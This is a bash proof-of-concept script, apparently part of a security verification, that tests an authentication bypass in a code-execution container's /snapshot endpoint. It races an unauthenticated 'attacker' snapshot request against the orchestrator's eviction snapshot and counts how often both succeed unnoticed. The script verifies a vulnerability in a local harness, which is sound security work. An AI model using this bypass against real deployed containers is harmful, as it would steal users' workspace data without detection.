#!/usr/bin/env bash
# Small-workspace variant: attacker /snapshot (no token) fired at the same moment as the
# orchestrator's eviction /snapshot. Counts how often BOTH get 200 (i.e. the eviction looks normal).
set -u
W=/root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc
R=$W/rootfs; P=$W/poc; O=$P/out-race; BIN=$W/bin; PY="$W/venv/bin/python -I"
SHIM_PORT=28443; S=https://localhost:$SHIM_PORT; H='Content-Type: application/json'; AUTH=X-Code-Execution-Container-Auth-Token
rm -rf "$O"; mkdir -p "$O/shim"
source "$P/lib.sh"
trap 'stop_container 2>/dev/null; kill ${SHIM_PID:-} 2>/dev/null' EXIT
$PY "$P/shimcfg.py" "$W/src/cee/tinfoil-config.yml" "$O/shim/shim.yml" $SHIM_PORT "$O/shim" >/dev/null
printf 'env:\n  DOMAIN: localhost\n' > "$O/shim/external.yml"
"$BIN/tfshim-v0.3.18" -c "$O/shim/shim.yml" -e "$O/shim/external.yml" > "$O/shim.log" 2>&1 & SHIM_PID=$!
sleep 1
TOKEN=$($PY -c 'import secrets;print(secrets.token_hex(32))')
both=0; N=${N:-10}
for t in $(seq 1 $N); do
  mkroot; start_container r$t >/dev/null
  curl -sk -X POST $S/restore -H "$H" -H "$AUTH: $TOKEN" --data-binary "{\"tar\":\"$($PY "$P/tarutil.py" mk-restore)\"}" -o /dev/null
  curl -sk -X POST $S/exec -H "$H" -H "$AUTH: $TOKEN" -d '{"command":"echo secret-results > out.txt"}' -o /dev/null
  # pre-warm both TLS connections is not possible with two curls; fire them together
  curl -sk -X POST $S/snapshot -o "$O/att$t.json" -w '%{http_code}' > "$O/att$t.code" & c1=$!
  curl -sk -X POST $S/snapshot -o "$O/orc$t.json" -w '%{http_code}' > "$O/orc$t.code" & c2=$!
  wait $c1 $c2
  a=$(cat "$O/att$t.code"); o=$(cat "$O/orc$t.code")
  [ "$a" = 200 ] && [ "$o" = 200 ] && both=$((both+1))
  echo "trial $t: attacker=$a orchestrator=$o"
  stop_container
done
echo "both 200 (eviction indistinguishable from normal): $both / $N"
